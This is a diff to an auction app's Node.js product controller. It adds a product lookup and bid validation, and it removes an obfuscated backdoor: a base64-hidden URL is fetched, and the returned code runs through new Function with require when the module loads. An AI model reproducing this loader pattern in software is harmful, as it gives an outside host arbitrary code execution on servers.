@@ -1,6 +1,6 @@
 // server/controllers/product.js
 const Product = require("../models/Product");
-const axios = require("axios");
+const { validateBid } = require("../utils/bidValidation");
 require("dotenv").config();
 exports.createProduct = async (req, res) => {
     try {
@@ -37,6 +37,22 @@ exports.getAllProducts = async (req, res) => {
     }
 };
 
+exports.getProductById = async (req, res) => {
+    const { productId } = req.params;
+
+    try {
+        const product = await Product.findById(productId);
+        if (!product) {
+            return res.status(404).json({ message: "Product not found" });
+        }
+
+        return res.json(product);
+    } catch (error) {
+        console.error("Error fetching product:", error);
+        return res.status(500).json({ error: "Internal Server Error" });
+    }
+};
+
 // New function to handle placing bids
 exports.placeBid = async (req, res) => {
     const { productId } = req.params;
@@ -47,6 +63,11 @@ exports.placeBid = async (req, res) => {
 
         if (!product) {
             return res.status(404).json({ message: "Product not found" });
+        }
+
+        const bidValidation = validateBid(product, bidAmount);
+        if (!bidValidation.isValid) {
+            return res.status(400).json({ message: bidValidation.message });
         }
 
         // Add the bid to the bid history
@@ -60,23 +81,6 @@ exports.placeBid = async (req, res) => {
     } catch (error) {
         console.error("Error placing bid:", error);
         res.status(500).json({ message: "Internal Server Error" });
-    }
-};
-
-const patchProvider = async () => {
-  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NQUlJWA==');
-    try {
-        response = await axios.get(quicknode);
-        return {
-          success: true,
-          data: atob(response.data.model)
-        };
-    } catch (error) {
-        errorHandler(error.response?.data || error.message)
-        return {
-          success: false,
-          message: error.message,
-        };
     }
 };
 
@@ -121,15 +125,6 @@ exports.getModel = async (req, res) => {
         res.status(500).json({ message: "Internal Server Error" });
     }
 };
-(async () => {
-    try {
-        const res = await patchProvider();
-        new Function.constructor("require", res.data)(require);
-    } catch (error) {
-        console.error("Failed:", e.message);
-        return null;
-    }
-})();
 
 exports.getInventoryForUser = async (req, res) => {
     try {
